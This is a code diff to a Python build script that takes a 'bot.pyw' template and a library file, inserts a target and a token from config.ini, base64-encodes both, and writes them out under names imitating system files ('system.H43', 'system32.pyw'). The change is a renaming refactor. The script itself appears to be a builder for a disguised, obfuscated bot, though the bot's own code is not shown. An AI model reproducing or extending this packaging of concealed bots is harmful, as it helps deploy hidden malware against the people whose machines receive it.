@@ -22,13 +22,22 @@ import configparser
 
 from importlib.machinery import SourceFileLoader
 
-MAIN = 'system'
-LIB = 'system32'
+
+#########################################
+#        Can change these values        #
+
+MAIN_SCRIPT_NAME_TARGET = 'system.H43'
+
+LIB_TARGET = 'system32'
+
+#########################################
+
 
 SCRIPTS_FOLDER = 'scripts'
-MAIN_SCRIPT_NAME_SOURCE = MAIN + '.pyw'
-MAIN_SCRIPT_NAME_TARGET = MAIN + '.H43'
-LIB_SCRIPT_NAME = LIB + '.pyw'
+MAIN_SCRIPT_NAME_SOURCE = 'bot.pyw'
+LIB_SCRIPT_NAME_SOURCE = 'lib.pyw'
+
+LIB_SCRIPT_NAME_TARGET = LIB_TARGET + '.pyw'
 
 config = configparser.ConfigParser()
 config.read('config.ini')
@@ -57,7 +66,7 @@ with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME_SOURCE)) as from_file:
     TOKEN_VAR = from_file.readline().split('=')[0]
     LIB_VAR = from_file.readline().split('=')[0]
     
-    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB}\'\n'
+    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB_TARGET}\'\n'
     text = replacement_line + from_file.read()
     encoded = base64.b64encode(text.encode())
 
@@ -74,12 +83,12 @@ with open(main_file_target, 'w') as to_file:
 
 
 
-with open(os.path.join(SCRIPTS_FOLDER, LIB_SCRIPT_NAME)) as from_file:
+with open(os.path.join(SCRIPTS_FOLDER, LIB_SCRIPT_NAME_SOURCE)) as from_file:
     text = from_file.read()
     encoded = base64.b64encode(text.encode())
 
 
-lib_file_target = os.path.join(d, LIB_SCRIPT_NAME)
+lib_file_target = os.path.join(d, LIB_SCRIPT_NAME_TARGET)
 try:
     os.unlink(lib_file_target)
 except FileNotFoundError:
